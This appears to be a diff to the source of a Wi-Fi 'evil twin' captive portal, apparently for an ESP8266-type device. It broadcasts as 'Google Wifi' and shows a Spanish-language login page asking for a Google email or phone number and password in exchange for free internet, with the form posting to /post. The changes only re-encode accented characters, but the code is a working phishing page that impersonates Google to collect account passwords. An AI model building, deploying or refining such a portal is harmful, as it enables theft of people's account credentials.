@@ -7,7 +7,7 @@
 const char* SSID_NAME = "Google Wifi";
 const char* SUBTITLE = "Conectando a méxico";
 const char* TITLE = "Validaci&oacute;n:";
-const char* BODY = "Accede con tu cuenta google y recibe 30 minutos de conexión ilimitada";
+const char* BODY = "Accede con tu cuenta google y recibe 30 minutos de conexi&oacute;n ilimitada";
 const char* POST_TITLE = "Validando";
 const char* POST_BODY = "Estamos validando tu cuenta, esto puede tomar hasta 2 minutos <br> espere un momento...";
 const char* PASS_TITLE = "Gomitas";
@@ -72,7 +72,7 @@ String pass() {
 }
 
 String index() {
-  return header(TITLE) + "<div id=login-text>" + BODY + "</ol></div><div><form action=/post method=post>" + "<b class=username-label> Usuario: </b> <center> <input type=text name=username placeholder=Email&nbsp;o&nbsp;número&nbsp;de&nbsp;teléfono></center>" + "<b class=password-label> Contraseña: </b> <center> <input type=password name=password placeholder=Contraseña></center>" + "<center><input type=submit value=Acceder></center></form>" + footer();
+  return header(TITLE) + "<div id=login-text>" + BODY + "</ol></div><div><form action=/post method=post>" + "<b class=username-label> Usuario: </b> <center> <input type=text name=username placeholder=Email&nbsp;o&nbsp;n&uacute;mero&nbsp;de&nbsp;tel&eacute;fono></center>" + "<b class=password-label> Contraseña: </b> <center> <input type=password name=password placeholder=Contraseña></center>" + "<center><input type=submit value=Acceder></center></form>" + footer();
 }
 
 String posted() {
